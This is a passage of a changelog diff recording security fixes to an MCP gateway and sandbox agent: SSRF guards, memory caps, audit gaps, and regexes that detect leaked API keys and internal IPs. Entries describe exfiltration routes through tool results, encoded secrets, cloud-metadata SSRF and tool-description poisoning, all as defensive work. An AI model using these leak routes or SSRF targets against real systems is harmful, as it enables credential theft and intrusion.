+  verbatim; (2) a NON-200 JSON body bypassed both scan branches (gated `== 200`) and returned raw. So a
+  secret/PII/infra string in a non-200 or non-JSON error body (`connect failed postgres://user:pass@10.1.2.3;
+  contact john@example.com`) egressed to the tenant unscanned — contradicting the CHG-0043 intent (scan
+  error content), which was only wired for 200. FIX (`mcp_proxy.py`): `import re` (was missing) +
+  `_is_text_content_type()` (text/*, application/json|xml|javascript|x-ndjson|graphql|*+json|*+xml; missing
+  CT defaults to application/json → text). Non-JSON text-like bodies are scanned via
+  `_scan_tool_result_floor(text)` before forwarding — WITHHELD on scan block/error; binary bodies
+  (image/*, octet-stream) pass through untouched (masking would corrupt them, not a text-leak vector).
+  Dropped the `status_code == 200` gate from the `result`+`error` JSON scans (run on ANY status) + new
+  `elif status != 200 and data is not None` fallback scans the WHOLE non-200 body lacking a JSON-RPC
+  result/error (`{"detail": ...}`, list, scalar). A 200 body without result/error is left untouched
+  (benign session/notif shape — no behaviour change). Fails closed throughout. Files: mcp_proxy.py,
+  test_mcp_bare_proxy_scan.py (+6). Gate: 39 ext-proxy + 1220 gateway passed, 0 failed. ORG path
+  unaffected (sandbox-routed via `broker_send_rpc` → parsed JSON-RPC dict scanned by the same floor).
+  Evidence: `mcp-parallel/findings/backstop-p2-ext-proxy-nonok-egress/`.
+
+- **CHG-0062** (2026-07-02) — G3 item 9 (gateway rate-limit) + item 11 (Redis correctness), MEDIUM
+  (Redis resource-leak on the MCP path): `rate_limit_enforcement.py::enforce_org_burst_rpm` (per-org
+  burst req/s + RPM req/min) did `current = await redis.incr(key)` then `if current == 1: await
+  redis.expire(key, ttl)` — two separate commands, for BOTH counters. On coroutine CANCELLATION (client
+  disconnect — routine under load) or crash BETWEEN the INCR and EXPIRE, the key was created with NO TTL
+  and orphaned forever; the TTL was set only when `current == 1`, so a cancelled first request means the
+  key never gets a TTL. Time-bucketed keys (`burst:{sec}` / `{minute}`) → unbounded Redis memory leak
+  under the 5k-10k-concurrent / chaos stress scenario. On the MCP path via `_mcp_org_rate_limit_raw` (all
+  3 entry points; CHG-0031/0032). INCONSISTENT with the already-atomic tool-call cap (`mcp_proxy.py ~1066`,
+  CHG-0048, `pipeline(transaction=True)` + `expire(nx=True)`) and `rate_limiter.py` (Lua eval). FIX: both
+  counters now run `INCR` + `EXPIRE NX` in ONE MULTI/EXEC transaction (matching the CHG-0048 idiom) —
+  ATOMIC (no INCR↔EXPIRE window) + SELF-HEALING (`EXPIRE NX` on every request re-sets a missing TTL, so a
+  previously-orphaned key is repaired on its next increment; NX means later same-bucket hits don't slide
+  the window — the count still rises). Fail-OPEN preserved. Files: rate_limit_enforcement.py,
+  test_rate_limit_atomic_ttl.py (+5). Gate: 5 atomic-ttl + 14 mcp_rate_limit + 1228 gateway passed, 0
+  failed. SIBLING (documented, NOT changed — one item/iteration): `leakage_detector.py:116-120` (sadd loop
+  then separate expire) is the same class, milder (unconditional expire refreshes the window). Evidence:
+  `mcp-parallel/findings/backstop-p11-ratelimit-atomic-ttl/`.
+
+- **CHG-0063** (2026-07-02) — G3 item 9 (gateway validation/DoS) + resource-limits (mem containment),
+  HIGH; closes CHG-0034's documented limitation: `_mcp_body_too_large` only pre-checks the Content-Length
+  HEADER, so a `Transfer-Encoding: chunked` / Content-Length-omitting request slips past it and
+  `await request.body()` / `request.json()` then buffer the ENTIRE stream into memory with NO ceiling
+  (gigabyte chunked body → gateway OOM). Affects the 3 tenant-facing MCP entry points (`ext_mcp_proxy`,
+  `org_mcp_jsonrpc`, `org_mcp_tool_call`). FIX (`mcp_proxy.py`): new `_MCPBodyTooLarge` +
+  `_mcp_read_body_capped(request)` reads `request.stream()` incrementally and raises the INSTANT the
+  running total crosses `_MCP_MAX_BODY_BYTES` (default 10MiB) — the gateway never holds more than the
+  ceiling in memory regardless of framing (proven: it stops after the crossing chunk, not after buffering
+  the whole stream). Capped bytes are cached on `request._body` so a downstream `request.json()`/`body()`
+  reuses the already-capped buffer. Wired at all 3 entry points (ext + bare-REST read via the helper →
+  bytes; org_mcp_jsonrpc caps+caches then keeps `request.json()` so `.json()`-mocking doubles are
+  unaffected), each returning the existing 413 `_mcp_body_too_large_response()`. The Content-Length
+  pre-check is retained (fast reject for a declared oversize). Files: mcp_proxy.py, test_mcp_body_cap.py
+  (+7). Gate: 7 body-cap + 1237 gateway passed, 0 failed (incl. an END-TO-END `org_mcp_tool_call`
+  oversized-chunked-stream → HTTP 413, and a "stops reading early / bounds memory" assertion). Scope: the
+  3 tenant-facing routes; backend-internal (X-Gateway-Internal-Key) paths still use plain `request.body()`
+  (lower risk; possible future defence-in-depth follow-up). Evidence:
+  `mcp-parallel/findings/backstop-p9-chunked-body-dos/`.
+
+- **CHG-0064** (2026-07-02) — G3 item 10 (resource-limits / mem containment), HIGH; response-side twin of
+  CHG-0063: the tenant-facing external passthrough `ext_mcp_proxy` buffers an UNTRUSTED external server's
+  WHOLE response via `sse_bytes = await resp.aread()` (finite SSE result) and `body_bytes = await
+  resp.aread()` (JSON/text/binary) with NO size ceiling. The code comment claimed "capped by the httpx
+  timeout" — but a timeout bounds TIME, not SIZE: a malicious/compromised tenant-configured external MCP
+  server can stream a multi-GB response FAST (within the timeout) and OOM the SHARED gateway → a
+  cross-tenant DoS one tenant's server inflicts on all others. FIX (`mcp_proxy.py`): new
+  `_MCP_MAX_RESPONSE_BYTES` (env `MCP_MAX_RESPONSE_BYTES`, default 10MiB) + `_read_response_capped(resp)`
+  iterates `resp.aiter_bytes()` incrementally and raises `_MCPBodyTooLarge` (reused from CHG-0063) the
+  INSTANT the running total crosses the ceiling — the gateway never holds more than the ceiling from an
+  untrusted upstream in memory. Both `aread()` sites use it; on overflow the response is WITHHELD with a
+  502 `mcp_upstream_response_too_large` (after closing the upstream stream + client). The non-finite SSE
+  passthrough (`async for chunk in aiter_bytes(): yield chunk`) is UNCHANGED — it streams chunk-by-chunk,
+  never holding the whole body, so it was never the DoS. Scope: the untrusted-upstream ext-proxy boundary;
+  the ORG path is sandbox-routed (broker) and the gVisor sandbox's own mem/disk limits contain a huge
+  sandbox response. Files: mcp_proxy.py, test_mcp_bare_proxy_scan.py (+3 integration, doubles gain
+  aiter_bytes), test_mcp_body_cap.py (+2 unit). Gate: 51 (ext+body-cap) + 1242 gateway passed, 0 failed
+  (oversized JSON upstream → 502; oversized SSE upstream → 502; normal response unaffected; existing 39
+  ext tests still pass). Evidence: `mcp-parallel/findings/backstop-p10-response-mem-dos/`.
+
+- **CHG-0065** (2026-07-02) — G3 item 12 (egress-lockdown / SSRF) + item 9 (validation), HIGH: the
+  tenant-facing `ext_mcp_proxy` validated the target ONLY by matching the hostname STRING against
+  `_ALLOWED_MCP_DOMAINS` (mcp.context7.com / api.githubcopilot.com / mcp.linear.app), then forwarded to
+  `https://{hostname}/...` — it NEVER resolved the host or checked the resolved IP. An allowlisted domain
+  that RESOLVES to an internal address (DNS rebinding, DNS hijack of a third-party domain, or a
+  misconfigured/future allowlist entry) is forwarded to → a caller reaches the cloud-metadata endpoint
+  `169.254.169.254` (IAM credential theft), loopback/link-local, or RFC-1918 internal services. The sibling
+  internal paths (`internal_discover_tools`/`internal_tools_call`) ALREADY guard this via
+  `is_safe_outbound_url` ("finding mcp#1"); ext_mcp_proxy was the omission. FIX (`mcp_proxy.py`):
+  ext_mcp_proxy calls `is_safe_outbound_url(target_url)` after building the target and before any
+  OAuth/body/forward work → 400 `Upstream URL rejected by SSRF guard: <reason>` on rejection.
+  `is_safe_outbound_url` (`_url_guard.py`) validates the scheme, resolves via getaddrinfo, and blocks any
+  private/loopback/link-local/cloud-metadata resolved IP, FAIL-CLOSED on parse/DNS error (`MCP_ALLOW_
+  INTERNAL_HOSTS` overrides for dev). httpx default `follow_redirects=False` → a 302-to-internal is
+  returned+response-scanned (CHG-0061/0064), not auto-followed, so the initial-target guard is the needed
+  control. No FP (real public allowlisted domains resolve to public IPs → allowed). Files: mcp_proxy.py,
+  test_mcp_bare_proxy_scan.py (+3 SSRF tests + 1 autouse hermeticity fixture). Gate: 45 ext + 1245 gateway
+  passed, 0 failed (guard-rejects → 400 wiring; REAL guard + allowlist={"localhost"} →
+  `ext_mcp_proxy("localhost/mcp")` resolves 127.0.0.1 → 400 e2e no-network; safe public host NOT blocked;
+  direct probe blocks localhost/169.254.169.254, allows mcp.linear.app). Evidence:
+  `mcp-parallel/findings/backstop-p12-ext-proxy-ssrf/`.
+
+- **CHG-0066** (2026-07-02) — G3 item 10 (resource-limits / mem containment), MEDIUM; sandbox-agent
+  counterpart of CHG-0064: the per-tenant sandbox agent (`services/mcp-broker/sandbox-image/agent/
+  upstream_manager.py`) dials the UNTRUSTED upstream MCP server via `client.stream(...)`, and for a JSON
+  (non-SSE) response did `raw = await response.aread()` then `if len(raw) > _MAX_RESPONSE_BYTES: raise` —
+  buffering the ENTIRE streaming body into memory BEFORE the size check. A malicious upstream returning a
+  multi-GB body OOMs the sandbox agent (up to the sandbox's 2GiB mem limit → kill + restart of that
+  tenant's sandbox) instead of a clean rejection at the 8MiB ceiling. The SSE branch right below was
+  ALREADY incremental (`aiter_lines` + running `total`); only the JSON branch had the buffer-then-check
+  anti-pattern (the same one CHG-0064 fixed on the gateway). FIX: the JSON branch reads incrementally via
+  `response.aiter_bytes()` + a running `_total`, raising `UpstreamError(-32000, "upstream response too
+  large")` the instant it crosses `_MAX_RESPONSE_BYTES` (env `MCP_AGENT_MAX_RESPONSE_BYTES`, default 8MiB)
+  — parity with the SSE branch; behaviour unchanged for legitimate responses. Files: upstream_manager.py,
+  test_upstream_proxy.py (+2, fake gains `aiter_bytes`). Gate: `pytest sandbox-image/agent/tests/
+  test_upstream_proxy.py -k "not websocket"` → 11 passed (JSON over-cap → -32000 "too large"; under-cap
+  still returns the result). The 3 `websocket` tests HANG in this env PRE-EXISTINGLY (real ws / async-loop
+  issue; streamable-http + SSE all pass, and this change is streamable-http-JSON only). Contained by the
+  sandbox 2GiB mem limit (CHG-0015). FOLLOW-UPS (documented): `_read_json_response` is dead code with the
+  same pattern; error-body reads read-whole-then-slice; `_validate_upstream` does allowlist matching but no
+  resolved-IP SSRF check (sandbox analogue of CHG-0065, relevant while the sandbox net is internal=false).
+  Evidence: `mcp-parallel/findings/backstop-p10-sandbox-response-cap/`.
+
+- **CHG-0067** (2026-07-02) — G3 item 12 (egress-lockdown / SSRF), HIGH; sandbox-side analogue of CHG-0065,
+  closes the CHG-0066 follow-up: the per-tenant sandbox agent (`services/mcp-broker/sandbox-image/agent/
+  upstream_manager.py`) dials the registered upstream MCP server; `_validate_upstream` matched the host
+  STRING against `allowed_hosts` but NEVER resolved the hostname or checked the resolved IP. An allowlisted
+  host that RESOLVES to an internal address (DNS rebinding, or a tenant registering a server whose hostname
+  points internally) is dialed from inside the sandbox, which (internal=false / open NAT) can reach
+  169.254.169.254 (IAM creds), loopback/link-local, or RFC-1918. This is the PRIMARY sandbox-routed path:
+  the gateway's `_adapter_forward`→`broker_send_rpc` does NOT `is_safe_outbound_url` the sandbox-routed
+  upstream (only ext-proxy [CHG-0065] + the internal paths do), so the sandbox agent's allowlist-string
+  check was the ONLY runtime guard. FIX: new `async _assert_upstream_not_ssrf(host)` resolves via the event
+  loop's non-blocking `getaddrinfo` (literal-IP hosts checked directly) and rejects `-32002 egress denied`
+  if ANY resolved IP is a cloud-metadata endpoint or `is_private`/`is_loopback`/`is_link_local`/`is_reserved`/
+  `is_multicast`/`is_unspecified`; FAIL-CLOSED on a resolution failure; called in `_get_session` BEFORE any
+  connection; `MCP_AGENT_ALLOW_INTERNAL_HOSTS` bypasses for dev. Files: upstream_manager.py,
+  test_upstream_proxy.py (+2 SSRF tests + hermeticity env in the app-load fixture). Gate: `pytest ...
+  test_upstream_proxy.py -k "not websocket"` → 13 passed (allowlisted `localhost`→127.0.0.1 → `-32002 ...
+  internal/reserved address (127.0.0.1)` before any connection; a public-resolving host [getaddrinfo mocked]
+  → NOT blocked, returns tools/list). The 3 `websocket` tests HANG in this env PRE-EXISTINGLY (unrelated;
+  streamable-http tests all pass). RESIDUAL: network-level egress lockdown (sandbox `internal=true` /
+  iptables) is the INFRA fix (item 12); a gateway-side `is_safe_outbound_url` on the sandbox-routed upstream
+  would add a second layer. Evidence: `mcp-parallel/findings/backstop-p12-sandbox-ssrf/`.
+
+- **CHG-0068** (2026-07-02) — G3 item 9 (gateway ... audit) / 1.4 `...→tag→AUDIT` chain, MEDIUM
+  (audit-completeness): `ext_mcp_proxy` recorded NO audit events — ZERO `_record_gateway_event` calls —
+  while every other MCP path (org_mcp_jsonrpc / org_mcp_tool_call / internal_tools_call) audits heavily. So
+  on the untrusted external-passthrough surface (credential-exfil attempts, PII egress, SSRF), a blocked
+  credential-in-args, a blocked/redacted PII result, and a blocked SSRF target were all INVISIBLE in the
+  MCPEvent trail — breaking the audit chain for external tool usage (a compliance/forensic blind spot; no
+  data leak). FIX (`mcp_proxy.py`): a local async `_ext_audit(decision, reason, *, tool, tags, findings)` in
+  ext_mcp_proxy calls the existing best-effort `_record_gateway_event` with the caller's org,
+  `server_slug="ext:<host>"` (external host isn't a registered org server), tool/decision/reason/latency +
+  compliance tags/findings — fire-and-forget (no added latency), safe no-op when unauthenticated (returns
+  early on empty org). Wired at: SSRF block (block/ssrf_blocked), inbound credential block
+  (block/credential_blocked_inbound), outbound result block (block/pii_blocked_outbound), outbound result
+  redaction (redact/pii_redacted_outbound). Additive — no behaviour change to forward/scan. Files:
+  mcp_proxy.py, test_mcp_bare_proxy_scan.py (+4). Gate: 49 ext (result-redaction → decision=redact w/
+  org_slug + `ext:` server_slug; SSRF → block/ssrf_blocked; credential → block/credential_blocked_inbound;
+  unauthenticated → safe no-op) + 1252 gateway passed, 0 failed. RESIDUAL (follow-up): the "allow" path +
+  infra-error withholds (non-200/non-JSON [CHG-0061], response-too-large [CHG-0064]) are not yet audited.
+  Evidence: `mcp-parallel/findings/backstop-p9-ext-proxy-audit/`.
+
+- **CHG-0069** (2026-07-02) — G3 item 10 (resource-limits / mem containment), MEDIUM; error-path
+  counterpart of CHG-0066: in the sandbox agent's streamable-http handler, an upstream error (status>=400)
+  was read as `body = (await response.aread())[:500]`. `response` is a `client.stream(...)` response, so
+  `aread()` buffers the ENTIRE untrusted error body into memory BEFORE the `[:500]` slice — a malicious
+  upstream returning a huge 4xx/5xx body OOMs the sandbox agent (up to the 2GiB sandbox limit → kill +
+  restart of that tenant's sandbox) even though only 500 bytes are used. FIX (`upstream_manager.py`): new
+  `async _aread_snippet(response, limit=1024)` streams `response.aiter_bytes()` and STOPS once `limit`
+  bytes are collected (returns at most `limit`), never buffering the whole body; the error read uses it
+  (`(await _aread_snippet(response))[:500]`). Behaviour unchanged for a normal small error body. Files:
+  upstream_manager.py, test_upstream_proxy.py (+2). Gate: `pytest ... -k "not websocket"` → 15 passed (a
+  500 upstream → `-32000 upstream HTTP 500: <bounded body>`; unit: `_aread_snippet` over a 1000-chunk body
+  with limit=250 → <=250 bytes, <=3 chunks consumed [stopped early]). The 3 `websocket` tests HANG in this
+  env PRE-EXISTINGLY (unrelated). Contained by the sandbox 2GiB mem limit. FOLLOW-UP: `_read_json_response`
+  (~257-304) is dead code with the same whole-body error reads — remove in a future cleanup. Evidence:
+  `mcp-parallel/findings/backstop-p10-sandbox-error-body-cap/`.
+
+- **CHG-0070** (2026-07-02) — G3 item 9 (gateway audit) / 1.4 `...→tag→AUDIT`, MEDIUM (completes CHG-0068):
+  CHG-0068 audited ext_mcp_proxy's SSRF block, credential block, and the JSON-branch result block/redact —
+  but MISSED (1) the SSE result block (`_scan_reframe_sse_tool_result` → `_block_info`), so a blocked SSE
+  tool result egressed NO audit event while the equivalent JSON block WAS audited (inconsistent); and (2)
+  any successful tool-call, so external tool USAGE was unrecorded (only blocks/redacts). FIX (`mcp_proxy.py`,
+  reusing the CHG-0068 `_ext_audit` helper — best-effort/fire-and-forget, no-op without org): audit the SSE
+  result block (block/pii_blocked_outbound w/ `_block_info` tags), the SSE result success (allow/ok), and the
+  JSON result success (allow/ok in the `elif` of the redact branch — so a call records exactly once: block
+  XOR redact XOR allow). Allow events gated on `_ext_tool_name` so protocol overhead (initialize/list) does
+  not flood the audit — only real tool invocations record usage. Files: mcp_proxy.py, test_mcp_bare_proxy_scan.py
+  (+2). Gate: 51 ext (clean tools/call → decision=allow w/ tool_name=fetch; SSE tools/call that blocks →
+  decision=block) + 1256 gateway passed, 0 failed. With CHG-0068 the ext-proxy now audits block XOR redact XOR
+  allow for every tool call on both the JSON and SSE paths. RESIDUAL: infra-error withholds (non-200/non-JSON
+  [CHG-0061], response-too-large [CHG-0064]) still not audited (transport errors already logged). Evidence:
+  `mcp-parallel/findings/backstop-p9-ext-proxy-audit-complete/`.
+
+- **CHG-0071** (2026-07-02) — G2 item 2 / 1.4 (provider secret-format detection gap, HIGH; found via an
+  adversarial `redact_all` secret-format sweep of ~20 real credential formats): 4 egressed UNMASKED AND were
+  not flagged by `detect_secrets` — Anthropic API key `sk-ant-…` (the OpenAI `sk-` family was caught but
+  `ant` wasn't in the alternation and `sk-[A-Za-z0-9]{32,}` fails on the hyphens), SendGrid `SG.<seg>.<seg>`,
+  GitLab PAT `glpat-…` (GitHub PATs were covered), Slack incoming-webhook `https://hooks.slack.com/services/…`.
+  SUBTLE: adding them only to `CREDENTIAL_EXPOSURE_PATTERNS` masks via `redact_all` but does NOT make
+  `detect_secrets` flag them — and the MCP tier1 scan (`_scan_text_tier1`, CHG-0057) uses `detect_secrets` to
+  DECIDE redact/block, so a result whose ONLY sensitive content is such a key triggers NO enforcement and
+  egresses raw. FIX (`patterns.py`): added all 4 to `SECRET_PATTERNS` (iterated by both `detect_secrets` via
+  `_detect_secrets_core` AND `redact_all` via `_redact_all_raw`) + `COMPLIANCE_TAG_MAP` (→ SECRET). Regexes:
+  `\bsk-ant-[A-Za-z0-9_-]{20,}\b`, `\bSG\.[A-Za-z0-9_-]{16,32}\.[A-Za-z0-9_-]{32,}\b`,
+  `\bglpat-[A-Za-z0-9_-]{20,}\b`, `https://hooks\.slack\.com/services/[A-Za-z0-9/_+-]+`. Near-zero FP (highly
+  specific prefixes/structures); default masker names the mask by the pattern key. Additive; no golden-case
+  change. Files: patterns.py, test_provider_secret_formats.py (+10). Gate: 10 (each format detect_secrets-
+  flagged + tagged SECRET + masked; benign battery no-FP) + 1266 gateway passed, 0 failed. Evidence:
+  `mcp-parallel/findings/backstop-p2-provider-secret-formats/`.
+
+- **CHG-0072** (2026-07-02) — G2 item 2 / 1.4 (2nd adversarial `redact_all` secret-format sweep after
+  CHG-0071), HIGH: 11 more real credential formats egressed UNMASKED + undetected — AWS STS temporary
+  access-key id `ASIA…` (the `aws_access_key` pattern was `\bAKIA[0-9A-Z]{16}\b`, long-term keys ONLY, so
+  session/temporary credentials leaked); DigitalOcean `dop_v1_`, Shopify `shp{at,ss,ca,pa}_`, Square
+  `sq0{atp,csp,idp}-`, Databricks `dapi`, HashiCorp Vault `hv{s,b}.`, Figma `figd_`, Telegram bot
+  `<id>:AA…`, PyPI `pypi-`, Linear `lin_api_`, Mailgun `key-<32hex>` — no patterns. FIX (`patterns.py`):
+  widened `aws_access_key` (in PII_PATTERNS → `detect_pii`) to `\b(?:AKIA|ASIA)[0-9A-Z]{16}\b` (AKIA
+  regression preserved); added 10 distinctive-prefix tokens to `SECRET_PATTERNS` (`detect_secrets` +
+  `redact_all`) + `COMPLIANCE_TAG_MAP` (→ SECRET). The Telegram pattern allows the optional `bot` URL
+  prefix (`\b(?:bot)?\d{8,10}:AA[A-Za-z0-9_-]{32,}\b`) so a token embedded in
+  `https://api.telegram.org/bot<token>/…` masks too. Each detected (drives tier1 redact/block), tagged
+  SECRET, masked. Near-zero FP (fixed prefix+length; benign battery — `api-key-value`, `monkey-`,
+  `shpattern`/`sq0`/`figd` substrings, `robot12345`/`chatbot999` — unchanged). Files: patterns.py,
+  test_more_provider_secrets.py (+18). Gate: 18 (each detected under its key + tagged SECRET + masked;
+  ASIA detect_pii-flagged + masked w/ AKIA regression; Telegram token in the API URL masked; benign no-FP)
+  + 1284 gateway passed, 0 failed. Evidence: `mcp-parallel/findings/backstop-p2-more-provider-secrets/`.
+
+- **CHG-0073** (2026-07-02) — G2 item 20 / 1.4 (3rd adversarial `redact_all` sweep — the IP-leakage
+  surface), MEDIUM, **closes a fail-OPEN**: `IP_LEAKAGE_PATTERNS` was IPv4-RFC1918-only, so a tool RESULT
+  containing internal IPv6 (ULA `fc00::/7`, link-local `fe80::/10`), a cloud-metadata/link-local IPv4
+  (`169.254.169.254` IMDS → hands out IAM creds; the exact SSRF target the dial-time guards CHG-0065/0067
+  block) or CGNAT IPv4 (`100.64.0.0/10`) egressed RAW (redact_all no-op, detect_ip_leakage empty). SUBTLE
+  FAIL-OPEN: `_redact_all_raw` masks infra via a **hardcoded key tuple**, not by iterating the dict — so a
+  dict-only add makes `detect_ip_leakage` FLAG the leak (tier1 decides redact) while `redact_all` leaves
+  it RAW → "report redacted while forwarding raw". FIX (`patterns.py`, all FOUR points so
+  detect==redact==tag==encoded-parity): added `internal_ipv6`
+  (`\b(?:f[cd][0-9a-f]{2}|fe[89ab][0-9a-f])(?:(?:::?[0-9a-f]{1,4})+(?:::)?|::)`, anchored on the internal
+  first hextet so a 2-hex MAC group / bare hex blob / HH:MM:SS timestamp never match; loopback `::1` NOT
+  flagged) and `link_local_ipv4` (`169.254.0.0/16` incl. IMDS + `100.64.0.0/10` CGNAT) to (1)
+  IP_LEAKAGE_PATTERNS→detect, (2) the `_redact_all_raw` infra tuple→mask, (3) `_INFRA_NETWORK_KEYS`→
+  encoded-infra bypass parity, (4) COMPLIANCE_TAG_MAP→`["INFRA"]`. Linear-time (no ReDoS), ~0 FP; RFC1918
+  control + goldens unchanged. +21 tests. Gate: 21 + 1305 gateway passed, 0 failed. Independent oracle:
+  `aidefence_scan` reports `piiFound:false` on the IMDS URL + ULA IPv6 (a generic scanner is BLIND to
+  infra-leak → the gap is real; purpose-built `detect_ip_leakage` is required). Evidence:
+  `mcp-parallel/findings/backstop-p20-internal-ipv6-metadata-leak/`.
+
+- **CHG-0074** (2026-07-02) — G2 item 2/20 / 1.4 (**devil's-advocate on CHG-0073**: are the IP patterns
+  actually WIRED into the live tool-RESULT enforcement path, or just padding `patterns.py`?),
+  MEDIUM–HIGH, **two fail-opens**. Tracing the real path (`_scan_tool_result_floor` → `_mcp_security_scan`
+  → `scan_mcp_payload`) showed they were NOT fully wired. **Gap 1:** the orchestrator
+  (`_scan_text_tier1`) DETECTS + TAGS `ip_leakage` (`INFRA`) but only REDACTS under
+  `enforcement=="redact"`; under the DEFAULT `tag`/`flag`/`monitor` posture it returns the result
+  UNMUTATED, and the mcp_proxy **E12 result-redaction floor** that upgrades `tag`→`redact` was gated on
+  `_findings_have_secret_or_pii` (matches `threat_type in (pii,secret)` ONLY — excludes the whole
+  `ip_leakage` class). Proven end-to-end at the real floor entrypoint under the default `tag` action: PII
+  `alice@…` + secret `sk-ant-…` are floored (safe) but `169.254.169.254` (IMDS), `fc00::1234:5678`,
+  **and even PRE-EXISTING RFC1918 `10.10.5.7`** egressed RAW. **Gap 2:** the floor re-scan
+  (`enforcement_override="redact"`) BLOCKS when a value `redact_all` can't mask survives (a private FILE
+  PATH beside the leak), but all 3 floor sites only swapped on `content changed` and IGNORED the re-scan's
+  `blocked` flag → swallowed block, raw forward (inconsistent with the same fn's fail-closed
+  except-handler; also hit PII+file-path). FIX (`mcp_proxy.py` + `mcp_scan_orchestrator.py`): (a)
+  `McpFinding` gains `matched_kinds: list[str]` (+ `to_finding_dict`); the pii/secret/ip_leak finding
+  passes `matched_kinds=kinds`. (b) new `_findings_have_infra_network_leak(findings)` → True iff an
+  `ip_leakage` finding's `matched_kinds` intersect `_INFRA_NETWORK_KEYS` (network keys `redact_all` masks)
+  — SCOPED to network so a file-path-only result never triggers the floor (→ never force-blocks a benign
+  code/file result). (c) OR'd into all 3 floor triggers. (d) all 3 sites PROPAGATE the floor-block
+  fail-closed (`[BLOCKED]`/`result_redaction_floor_block`). Net: internal-network addrs in results MASKED
+  under the default posture; file-path-only stays raw/flag-tier (no regression); network|PII + file-path
+  fails CLOSED. +11 tests (drive the REAL floor). Gate: 11 + 1316 gateway passed, 0 failed; broker
+  `-k "not websocket"` 108 passed. Evidence: `mcp-parallel/findings/backstop-p20-ipleak-result-floor/`.
+
+- **CHG-0075** (2026-07-02) — G2 item 2 / 1.4 (**devil's-advocate on the detect_* completeness**: does
+  the MCP tier-1 scan run EVERY detector?), HIGH: `mcp_scan_orchestrator._scan_text_tier1` ran
+  `detect_pii` + `detect_secrets` + `detect_ip_leakage` but **NOT `detect_credential_exposure`**.
+  `CREDENTIAL_EXPOSURE_PATTERNS` is a SEPARATE dict (`bearer_token`, `connection_string`,
+  `exposed_password`, `private_key_block`, `github_fine_grained_pat`, `stripe_key`, `azure_storage_key`,
+  `twilio_api_key`, `gcp_service_account_key`, `slack_token`, `jwt`) NOT read by `detect_secrets`.
+  `redact_all` masks it, but the MCP scan uses `detect_*` to DECIDE enforcement — so a credential whose
+  ONLY match was a CREDENTIAL_EXPOSURE kind (Stripe `sk_live_`, Twilio `SK<32hex>`, Azure `AccountKey=`, a
+  DB connection string's password) was never DETECTED → drove no enforcement → egressed RAW on a tool
+  RESULT (verified end-to-end at the default `tag` posture) and passed unblocked in tool ARGS to a
+  possibly-untrusted upstream. Same wrong-dict class as CHG-0071. **Part B:** 7 of those keys
+  (`github_fine_grained_pat`, `stripe_key`, `azure_storage_key`, `twilio_api_key`,
+  `gcp_service_account_key`, `slack_token`, `jwt`) had NO `COMPLIANCE_TAG_MAP` entry →
+  `get_compliance_tags` returned `[]` → never tagged `SECRET` (breaks enforce-by-tag + audit + the arg
+  force-block's SECRET-tag path). FIX: (a) `_scan_text_tier1` imports + calls
+  `detect_credential_exposure(text)`, folded into the detect branch (`kinds`/`matched_kinds`/byte-verify
+  `_detected_values` + threat precedence `pii > secret/credential > ip_leakage` — a credential exposure is
+  `threat_type="secret"` so it drives the result redact floor AND the arg credential force-block); (b)
+  `COMPLIANCE_TAG_MAP` += the 7 keys → `["SECRET","SOC2"]`. Net: Stripe/Twilio/Azure/conn-string/GCP-SA in
+  results MASKED + tagged `SECRET,SOC2`; same in args force-blocked; bearer/jwt/slack unchanged; benign
+  no-FP. +11 tests. Gate: 11 + 1327 gateway passed, 0 failed; broker `-k "not websocket"` 108 passed.
+  Evidence: `mcp-parallel/findings/backstop-p2-cred-exposure-mcp-scan/`.
+
+- **CHG-0076** (2026-07-02) — G2 item 2 / 1.4 (**devil's-advocate on chat-vs-MCP scan parity**: does the
+  MCP scan have the chat scanner's obfuscation check?), MEDIUM–HIGH: the chat OUTPUT scanner
+  (`scanner._scan_output_sync`, G33/G35) decodes text-encoding variants via
+  `_decode_text_encoding_variants` (HTML char refs `&#..;`, percent-encoding, `\u`/`\x` escapes) so an
+  encoded PII/secret a markdown/browser client renders back is caught. The MCP orchestrator tier-1
+  (`_scan_text_tier1`) had **NO such check** — raw `detect_pii/secrets/ip_leakage/credential_exposure`
+  only. `detect_secrets` folds base64/hex transport, but a SECRET / CREDENTIAL / INTERNAL-NETWORK IP
+  hidden by a TEXT-encoding dodges the raw regexes, and `redact_all` cannot mask an encoded run — so an
+  encoded credential / internal IP in a tool RESULT egressed (verified: HTML-entity + percent-encoded
+  `sk-ant-…` and `10.0.0.5` NOT flagged by the MCP floor while the chat path caught them), and a
+  markdown/HTML MCP client decodes it back to the value = a laundering/exfil channel for an untrusted
+  external MCP server (same class in tool ARGS). FIX (`mcp_scan_orchestrator.py`): `_scan_text_tier1`
+  (after the raw detect branch) decodes `_decode_text_encoding_variants(text)`; if a decoded variant
+  reveals a SECRET (`detect_secrets`) / CREDENTIAL (`detect_credential_exposure`) / internal-NETWORK IP
+  (`detect_ip_leakage` ∩ `_INFRA_NETWORK_KEYS`) the raw text lacked → appends `threat_type="secret"` +
+  **BLOCKS** (fail-closed) under any non-`monitor` posture (redact_all can't mask the encoded run; mirrors
+  the chat INPUT path `scanner._scan_prompt_sync`). SCOPED for FP control: generic PII EXCLUDED (a scraped
+  HTML page's entity-encoded contact email is usually benign → no false-block of legit web/HTML tool
+  results); file paths excluded. Applies to input+output; plain text → `_decode_text_encoding_variants`
+  returns `[]` so the loop never runs (negligible overhead). Net: encoded secret/IP in a RESULT or ARGS
+  BLOCKS; encoded generic PII email NOT blocked; raw secret still masked-not-blocked (no regression);
+  benign HTML entities (`&amp;`/`&#8212;`/`&lt;`)/plain/URL no-FP. +9 tests. Gate: 9 + 1327 gateway
+  passed, 0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p2-mcp-encoded-exfil/`.
+
+- **CHG-0077** (2026-07-02) — G2 item 2 / 1.4 (**devil's-advocate on tool poisoning**: does the org path
+  scan tool descriptions?), MEDIUM: tool descriptions returned by `tools/list` come LIVE from the untrusted
+  upstream MCP server and are shown to the model (canonical tool-poisoning / line-jumping surface). The
+  EXTERNAL proxy path scans `tools/list` (in `_EXT_FINITE_RESULT_METHODS`), but the ORG `tools/list`
+  handler (`org_mcp_jsonrpc`) — BOTH the sandbox-routed **adapter** sub-path AND the **backend** sub-path —
+  returned the tools list after only visibility filters (`_filter_tools_by_enabled` /
+  `_filter_tools_by_key_allowlist`) with **NO content scan**. So a secret / PII / internal-IP (or a
+  CHG-0076 text-encoded exfil payload) embedded in a tool `description` egressed to the model on the
+  primary org path. FIX (`mcp_proxy.py`): new `_scanned_tools_list_response(payload,…)` runs the tools/list
+  `result` through `_scan_tool_result_floor` (inherits CHG-0074 IP-network floor + CHG-0075
